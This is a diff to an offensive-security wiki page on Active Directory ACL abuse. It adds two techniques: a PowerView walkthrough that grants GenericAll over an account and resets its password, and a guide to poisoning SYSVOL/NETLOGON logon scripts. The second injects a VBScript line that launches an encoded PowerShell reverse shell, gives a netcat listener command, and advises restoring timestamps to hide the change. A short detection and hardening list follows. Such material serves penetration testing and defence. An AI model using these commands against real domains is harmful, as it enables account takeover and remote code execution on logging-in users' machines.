@@ -143,6 +143,31 @@ $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
 
+### WriteDACL/WriteOwner quick takeover (PowerView)
+
+When you have `WriteOwner` and `WriteDacl` over a user or service account, you can take full control and reset its password using PowerView without knowing the old password:
+
+```powershell
+# Load PowerView
+. .\PowerView.ps1
+
+# Grant yourself full control over the target object (adds GenericAll in the DACL)
+Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose
+
+# Set a new password for the target principal
+$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
+Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
+```
+
+Notes:
+- You may need to first change the owner to yourself if you only have `WriteOwner`:
+
+```powershell
+Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
+```
+
+- Validate access with any protocol (SMB/LDAP/RDP/WinRM) after password reset.
+
 ## **Replication on the Domain (DCSync)**
 
 The DCSync attack leverages specific replication permissions on the domain to mimic a Domain Controller and synchronize data, including user credentials. This powerful technique requires permissions like `DS-Replication-Get-Changes`, allowing attackers to extract sensitive information from the AD environment without direct access to a Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)
@@ -208,16 +233,93 @@ The XML configuration file for Users and Groups outlines how these changes are i
 
 Furthermore, additional methods for executing code or maintaining persistence, such as leveraging logon/logoff scripts, modifying registry keys for autoruns, installing software via .msi files, or editing service configurations, can also be considered. These techniques provide various avenues for maintaining access and controlling target systems through the abuse of GPOs.
 
+## SYSVOL/NETLOGON Logon Script Poisoning
+
+Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.
+
+### Locate logon scripts
+- Inspect user attributes for a configured logon script:
+
+```powershell
+Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
+```
+
+- Crawl domain shares to surface shortcuts or references to scripts:
+
+```bash
+# NetExec spider (authenticated)
+netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
+```
+
+- Parse `.lnk` files to resolve targets pointing into SYSVOL/NETLOGON (useful DFIR trick and for attackers without direct GPO access):
+
+```bash
+# LnkParse3
+lnkparse login.vbs.lnk
+# Example target revealed:
+# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
+```
+
+- BloodHound displays the `logonScript` (scriptPath) attribute on user nodes when present.
+
+### Validate write access (don’t trust share listings)
+Automated tooling may show SYSVOL/NETLOGON as read-only, but underlying NTFS ACLs can still allow writes. Always test:
+
+```bash
+# Interactive write test
+smbclient \\<dc>\SYSVOL -U <user>%<pass>
+smb: \\> cd <domain>\scripts\
+smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
+```
+
+If file size or mtime changes, you have write. Preserve originals before modifying.
+
+### Poison a VBScript logon script for RCE
+Append a command that launches a PowerShell reverse shell (generate from revshells.com) and keep original logic to avoid breaking business function:
+
+```vb
+' At top of login.vbs
+Set cmdshell = CreateObject("Wscript.Shell")
+cmdshell.run "powershell -e <BASE64_PAYLOAD>"
+
+' Existing mappings remain
+MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
+MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
+```
+
+Listen on your host and wait for the next interactive logon:
+
+```bash
+rlwrap -cAr nc -lnvp 443
+```
+
+Notes:
+- Execution happens under the logging user’s token (not SYSTEM). Scope is the GPO link (OU, site, domain) applying that script.
+- Clean up by restoring the original content/timestamps after use.
+
+### Detection and hardening
+- Enable file auditing/DFSR alerts on `\\SYSVOL\<domain>\scripts\` and `\\NETLOGON` for unexpected changes.
+- Restrict write permissions to admins; review delegated groups that inherit write on SYSVOL paths.
+- Monitor GPO and user `scriptPath` changes; diff SYSVOL against a baseline (FSRM/DFSR health reports).
+- Consider replacing legacy logon scripts with modern mechanisms and signed scripts.
+
+### Useful tooling
+- NetExec spider_plus for share crawl and user/password spraying.
+- LnkParse3 to resolve `.lnk` targets: https://github.com/Matmaus/LnkParse3
+- BloodHound CE for graphing ACLs/GPO reach: https://bloodhound.specterops.io/
+
 ## References
 
-- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
+- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
 - [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
 - [https://wald0.com/?p=112](https://wald0.com/?p=112)
 - [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
 - [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
 - [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
-- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
+- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
+- [HTB BabyTwo: SYSVOL logon script poisoning and AD ACL abuse to service-account takeover](https://0xdf.gitlab.io/2025/09/26/htb-babytwo.html)
+- [PowerView.ps1 (PowerSploit)](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+- [BloodHound CE quickstart](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)
+- [LnkParse3](https://github.com/Matmaus/LnkParse3)
 
 {{#include ../../../banners/hacktricks-training.md}}
-
-
